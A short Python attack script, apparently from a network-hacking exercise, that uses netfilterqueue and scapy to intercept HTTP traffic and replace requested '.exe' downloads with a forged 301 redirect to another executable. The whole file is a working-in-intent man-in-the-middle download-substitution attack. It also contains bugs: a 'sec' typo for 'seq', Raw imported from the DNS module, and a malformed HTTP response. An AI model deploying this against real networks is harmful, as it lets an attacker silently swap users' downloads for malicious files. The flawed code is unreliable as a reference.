#!/usr/bin/env python3
import netfilterqueue
from scapy.layers.inet import IP, TCP
from scapy.layers.dns import Raw

ack_list = []
def process_packet(packet):
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].dport == 80:
            print("HTTP Request: ")
            if ".exe" in scapy_packet[Raw].load:
                print("[+] Exe Request: ")
                ack_list.append(scapy_packet[TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[TCP].sport == 80:
            print("HTTP Response: ")
            if scapy_packet[TCP].sec in ack_list:
                ack_list.remove(scapy_packet[TCP].seq)
                print("[+] Replacing File: ")
                scapy_packet[Raw].load = "301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum
                packet.set_payload(str(scapy_packet))
                return packet
    packet.accept()
    return None 

if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()


